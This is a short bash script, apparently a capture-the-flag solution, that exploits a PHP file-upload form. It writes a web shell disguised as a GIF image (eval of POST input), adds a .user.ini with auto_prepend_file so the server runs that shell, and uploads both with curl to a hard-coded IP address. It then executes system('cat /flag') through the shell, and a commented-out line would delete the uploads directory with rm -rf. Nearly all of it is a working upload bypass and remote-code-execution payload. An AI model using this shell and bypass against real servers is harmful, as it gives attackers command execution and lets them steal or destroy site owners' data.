#!/usr/bin/env bash

# Author : Virink <virink@outlook.com>
# Date   : 2019/08/18, 23:41

echo "[+] Gen vk.jpg"
echo 'GIF89a<script language="php">eval($_POST[1]);</script>' > vk.jpg
cat vk.jpg
echo

echo "[+] Gen .user.ini"
echo 'GIF89a' > .user.ini
echo 'auto_prepend_file=vk.jpg' >> .user.ini
cat .user.ini
echo

echo "[+] Upload vk.jpg"
curl -s -q http://47.111.59.243:9021/index.php -F fileUpload=@vk.jpg -F upload="提交" > /dev/null
echo "[+] Upload .user.ini"
curl -s -q http://47.111.59.243:9021/index.php -F fileUpload=@.user.ini -F upload="提交" | grep uploads | awk -F '/' '{print $2}' | awk -F ' ' '{print $1}' > tmp
echo

echo "[+] Get Flag"
# system('rm -rf /app/uploads/*');
curl -s -q "http://47.111.59.243:9021/uploads/$(cat tmp)/index.php" \
    -d "1=system('cat /flag');"
echo 

echo "[+] Clear"
rm *.jpg .user.ini tmp